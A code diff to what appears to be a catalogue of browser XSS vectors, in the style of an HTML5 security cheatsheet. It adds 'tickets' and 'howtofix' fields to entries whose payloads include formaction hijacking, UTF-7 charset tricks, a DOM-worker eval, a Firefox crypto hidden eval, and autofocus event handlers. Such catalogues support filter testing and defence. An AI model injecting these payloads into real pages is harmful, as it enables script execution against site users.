@@ -7,7 +7,9 @@
             'name'       : 'XSS via formaction - requiring user interaction',
             'data'       : '<form id="test" /><button form="test" formaction="%js_uri_alert%">X',
             'description': 'A vector displaying the HTML5 form and formaction capabilities for form hijacking outside the actual form.',
-            'browsers'   : {
+            'tickets'    : [],
+			'howtofix'   : 'Don\'t allow users to submit markup containing form and formaction attributes or transform them to bogus attributes',
+			'browsers'   : {
                 'opera': ['10.5']
             },
             'tags'       : ['xss', 'html5', 'ff', 'gc'],
@@ -19,6 +21,8 @@
             'name'       : 'XSS via x-imap4-modified-utf7 (1)',
             'data'       : '<meta charset="x-imap4-modified-utf7">%js_utf7_alert_1%',
             'description': 'This vector shows how UTF7 derivations can be used to generate very hard to detect XSS vectors in exotic charsets',
+            'tickets'    : [],
+            'howtofix'   : '',
             'browsers'   : {
                 'firefox': [
                     '2.x', '3.5', '3.6', '3.7'
@@ -33,7 +37,9 @@
             'name'       : 'XSS via x-imap4-modified-utf7 (2)',
             'data'       : '<meta charset="x-imap4-modified-utf7">%js_utf7_alert_2%',
             'description': 'This vector shows how UTF7 derivations can be used to generate very hard to detect XSS vectors in exotic charsets',
-            'browsers'   : {
+            'tickets'    : [],
+            'howtofix'   : '',            
+			'browsers'   : {
                 'firefox': [
                     '2.x', '3.5', '3.6', '3.7'
                 ]
@@ -47,7 +53,9 @@
             'name'       : 'Self-including DOM Worker XSS',
             'data'       : '0?<script>Worker("#").onmessage=function(_)eval(_.data)</script>:postMessage(importScripts(\'data:;base64,cG9zdE1lc3NhZ2UoJ2FsZXJ0KDEpJyk\'))',
             'description': 'A self-including code snippet utilizing a DOM worker and firing a message event to itself causing script execution',
-            'browsers'   : {
+            'tickets'    : [],
+            'howtofix'   : '',            
+			'browsers'   : {
                 'firefox': [
                     '3.5', '3.6', '3.7'
                 ]
@@ -61,7 +69,9 @@
             'name'       : 'Firefox crypto object - hidden eval()',
             'data'       : 'crypto.generateCRMFRequest(\'CN=0\',0,0,null,\'%js_alert%\',384,null,\'rsa-dual-use\')',
             'description': 'This vector uncovers a hidden eval() inside the Firefox crypto object',
-            'browsers'   : {
+            'tickets'    : [],
+            'howtofix'   : '',            
+			'browsers'   : {
                 'firefox': [
                     '2.x', '3.x', '3.5', '3.6', '3.7'
                 ]
@@ -75,7 +85,9 @@
             'name'       : 'Firefox setter based JavaScript execution',
             'data'       : '({set/**/$($){_/**/setter=$,_=1}}).$=%js_alert_only%',
             'description': 'Using setters on Gecko/Firefox to execute JavaScript without parenthesis',
-            'browsers'   : {
+            'tickets'    : [],
+            'howtofix'   : '',            
+			'browsers'   : {
                 'firefox': [
                     '1.x', '2.x', '3.x', '3.5', '3.6', '3.7'
                 ]
@@ -89,7 +101,9 @@
             'name'       : 'Self-executing focus event via autofocus',
             'data'       : '<input onfocus=%js_write% autofocus>',
             'description': 'This vector uses an input element with autofocus to call its own focus event handler - no user interaction required',
-            'browsers'   : {
+            'tickets'    : [],
+            'howtofix'   : '',            
+			'browsers'   : {
                 'opera': [
                     '10.5'
                 ],
@@ -106,7 +120,9 @@
             'name'       : 'Self-executing blur event via autofocus competition',
             'data'       : '<input onblur=%js_write% autofocus><input autofocus>',
             'description': 'Here we have two HTML input elements competing for the focus - and one executing JavaScript on losing its focus',
-            'browsers'   : {
+            'tickets'    : [],
+            'howtofix'   : '',            
+			'browsers'   : {
                 'opera': [
                     '10.5'
                 ],
@@ -123,7 +139,9 @@
             'name'       : 'Opera link-source JavaScript execution via CSS',
             'data'       : '<div style="-o-link:\'%js_uri_alert%\';-o-link-source:current">X',
             'description': 'Opera allows setting link sources for arbitrary HTML elements - making them clickable and execute JavaScript',
-            'browsers'   : {
+            'tickets'    : [],
+            'howtofix'   : '',            
+			'browsers'   : {
                 'opera': [
                     '8.0', '9.0', '10.0', '10.5'
                 ]
